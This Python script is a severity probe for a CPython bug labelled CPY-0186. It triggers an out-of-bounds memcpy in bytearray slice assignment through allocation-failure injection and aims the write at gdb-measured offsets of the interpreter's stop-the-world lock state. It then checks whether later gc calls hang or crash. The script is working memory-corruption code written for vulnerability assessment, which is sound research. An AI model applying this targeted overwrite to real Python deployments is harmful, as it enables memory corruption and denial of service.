#!/usr/bin/env python3
"""CPY-0186 severity probe: aim the OOB write at the stop-the-world state.

CPY-0186 (`uninitialized-dealloc-auditor` U1) is an out-of-bounds `memcpy` at
`Objects/bytearrayobject.c:631` whose destination base is
`&_PyRuntime.static_objects.singletons.bytes_empty.ob_sval[0]` and whose offset
`lo` is the Python-chosen slice low index.  `static_objects` is the
second-to-last field of `struct pyruntimestate`; the last is
`PyInterpreterState _main_interpreter`.  So a positive `lo` walks forward
through the singletons and then through the *entire* interpreter state.

Measured with gdb on the matrix binaries, the byte offset of
`_PyRuntime._main_interpreter.stoptheworld` from the write base is:

    release-ft-nojit  106016      debug-ft-nojit  106016
    release-gil-nojit  83800      debug-gil-nojit  83808

`struct _stoptheworld_state` is 24 bytes (`Include/internal/pycore_interp_structs.h:412`):
    +0  PyMutex mutex          serializes stop-the-world attempts
    +1  bool requested
    +2  bool world_stopped
    +3  bool is_global
    +4  PyEvent stop_event
    +8  Py_ssize_t thread_countdown
    +16 PyThreadState *requester

`_PyEval_StopTheWorld` is `#ifdef Py_GIL_DISABLED` (`Python/pystate.c:2547`), so
these bytes are load-bearing only on a free-threaded build.

Scenarios (all use size=200000 so `lo` can reach the interpreter state):
    stw       lo = the measured stoptheworld offset, 24 bytes of 0xFF
    stw_ctl   lo = 8 (the bytes_characters singletons), 24 bytes of 0xFF --
              same injection, same payload, a target with no lock in it
    none      no injection at all

Probe: `gc.freeze()` then `gc.collect()`.  Both call `_PyEval_StopTheWorld` on a
free-threaded build (`Python/gc_free_threading.c:2492` and `:2067`).  A child
that never returns is the interesting result: a corrupted `PyMutex` or a
corrupted `is_global` makes the *next* pause hang rather than crash.

Usage
    python stw_runtime_oob_target.py <python> [scenario ...]
    python stw_runtime_oob_target.py <python> --n <scenario> <index>
"""

import subprocess
import sys

# measured with gdb: (char*)&_PyRuntime._main_interpreter.stoptheworld
#                  - (char*)&_PyRuntime.static_objects.singletons.bytes_empty.ob_sval[0]
STW_OFFSET = {
    "release-ft-nojit": 106016,
    "debug-ft-nojit": 106016,
    "release-gil-nojit": 83800,
    "debug-gil-nojit": 83808,
}

# `bytearray_resize_lock_held:240` only reaches `_PyBytes_Resize` on a shrink
# when `requested_size < ob_alloc / 2` ("Major downsize"); a minor downsize takes
# the `Py_SET_SIZE` quick exit at :246 and never allocates.  `requested_size` here
# is `lo + 24`, so SIZE must be more than twice the largest `lo` we aim at.
SIZE = 400_000
TIMEOUT = 25

CHILD = r'''
import sys, faulthandler
faulthandler.enable()
import _testcapi, gc

SIZE, LO, BL, N = {size}, {lo}, {bl}, {n}
src = bytes(b'\xFF' * BL)

# Warm the path UNARMED so the injection budget lands on the slice assignment.
b = bytearray(b'x' * SIZE)
try:
    b[LO:SIZE] = src
except MemoryError:
    pass
b = bytearray(b'x' * SIZE)

if N >= 0:
    _testcapi.set_nomemory(N, N + 1)
try:
    b[LO:SIZE] = src
    r = "no-exception"
except MemoryError:
    r = "MemoryError"
except BaseException as e:
    r = "%s: %s" % (type(e).__name__, e)
finally:
    try:
        _testcapi.remove_mem_hooks()
    except Exception:
        pass
# A negative Py_SIZE proves the stale bpo-19568 recovery at :603 ran, i.e. that
# the OOB memcpy at :631 executed.  `len()` returns NULL on a negative size, so
# CPython raises SystemError (release) or aborts (debug); catch it.
try:
    _n = len(b)
except BaseException as e:
    _n = "EXC %s" % type(e).__name__
print("OP:%s len=%s" % (r, _n))
sys.stdout.flush()

# --- probes that go through _PyEval_StopTheWorld on a free-threaded build ---
for label, fn in (
    ("gc.freeze",   gc.freeze),
    ("gc.unfreeze", gc.unfreeze),
    ("gc.collect",  gc.collect),
    ("gc.get_objects_len", lambda: len(gc.get_objects())),
):
    try:
        print("STW:%s=%r" % (label, fn()))
    except BaseException as e:
        print("STW:%s=EXC %s: %s" % (label, type(e).__name__, e))
    sys.stdout.flush()
print("DONE")
'''


def run(python, lo, n):
    src = CHILD.format(size=SIZE, lo=lo, bl=24, n=n)
    try:
        return subprocess.run([python, "-c", src], capture_output=True,
                              text=True, timeout=TIMEOUT)
    except subprocess.TimeoutExpired as e:
        class T:
            returncode = "TIMEOUT"
            stdout = (e.stdout or b"").decode(errors="replace") if isinstance(e.stdout, bytes) else (e.stdout or "")
            stderr = (e.stderr or b"").decode(errors="replace") if isinstance(e.stderr, bytes) else (e.stderr or "")
        return T()


def show(p, prefix=""):
    out = " | ".join(x for x in p.stdout.splitlines() if x)
    print(f"{prefix}rc={p.returncode!s:>8} {out}")
    if p.returncode not in (0, 1):
        head = p.stderr.strip().splitlines()[:10]
        if head:
            print("        " + "\n        ".join(head))


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        return 2
    python = sys.argv[1]
    build = None
    for name in STW_OFFSET:
        if name in python:
            build = name
    if build is None:
        print("cannot infer build name from %r; offsets are per-build" % python)
        return 2
    lo_stw = STW_OFFSET[build]
    print(f"### build={build}  stoptheworld offset from write base = {lo_stw}")

    rest = sys.argv[2:]
    if rest and rest[0] == "--n":
        lo = lo_stw if rest[1] == "stw" else 8
        show(run(python, lo, int(rest[2])))
        return 0

    for label, lo in (("stw", lo_stw), ("stw_ctl", 8)):
        print(f"--- {label}: lo={lo}, 24 bytes of 0xFF")
        show(run(python, lo, -1), prefix="  control (no injection) ")
        for n in range(0, 14):
            p = run(python, lo, n)
            interesting = (
                p.returncode != 0
                or "DONE" not in p.stdout
                or "EXC" in p.stdout
                or "no-exception" not in p.stdout or "len=400000" not in p.stdout
            )
            if interesting:
                show(p, prefix=f"  n={n:<3d}                  ")
        print()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
